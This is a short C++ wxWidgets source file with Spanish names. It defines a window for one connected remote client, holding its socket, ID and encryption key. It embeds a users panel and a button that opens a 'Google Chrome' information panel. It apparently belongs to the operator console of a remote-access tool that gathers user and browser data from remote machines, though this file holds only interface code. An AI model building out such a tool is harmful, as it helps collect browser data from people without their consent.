#include "panel_informacion.hpp"
#include "panel_info_chrome.hpp"
#include "panel_usuarios.hpp"
#include "server.hpp"
#include "misc.hpp"

wxBEGIN_EVENT_TABLE(panelInformacion, wxFrame)
	EVT_BUTTON(EnumPanelInfoIDS::BTN_Chrome, panelInformacion::OnChromeInfo)
wxEND_EVENT_TABLE()

panelInformacion::panelInformacion(wxWindow* _wxParent, SOCKET _sckSocket, std::string _strID, ByteArray c_key)
	:wxFrame(_wxParent, wxID_ANY, "Informacion", wxDefaultPosition, wxDefaultSize) {

	this->sckCliente = _sckSocket;
	this->enc_key = c_key;
	this->strdID = _strID;
	this->SetTitle("[" + _strID + "] Informacion");

	wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);

	main_sizer->Add(new panelUsuarios(this, _sckSocket, _strID, c_key), 1, wxALL | wxEXPAND, 1);
	main_sizer->Add(new wxButton(this, EnumPanelInfoIDS::BTN_Chrome, "Google Chrome"), 0);
	
	this->SetSizerAndFit(main_sizer);

	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void panelInformacion::OnChromeInfo(wxCommandEvent& event) {
	panelInfoChrome* pnlchrome = new panelInfoChrome(this, this->sckCliente, this->GetTitle(), this->strdID, this->enc_key);
	pnlchrome->Show(true);
}